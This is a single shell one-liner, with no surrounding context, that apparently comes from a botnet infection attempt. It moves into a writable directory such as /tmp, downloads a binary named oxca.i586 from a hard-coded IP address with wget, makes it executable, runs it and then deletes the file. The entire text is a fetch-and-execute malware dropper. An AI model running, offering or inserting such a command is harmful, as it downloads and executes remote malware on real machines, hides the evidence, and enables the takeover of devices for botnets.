cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://212.237.53.32/oxca.i586; chmod +x oxca.i586; ./oxca.i586; rm -rf oxca.i586
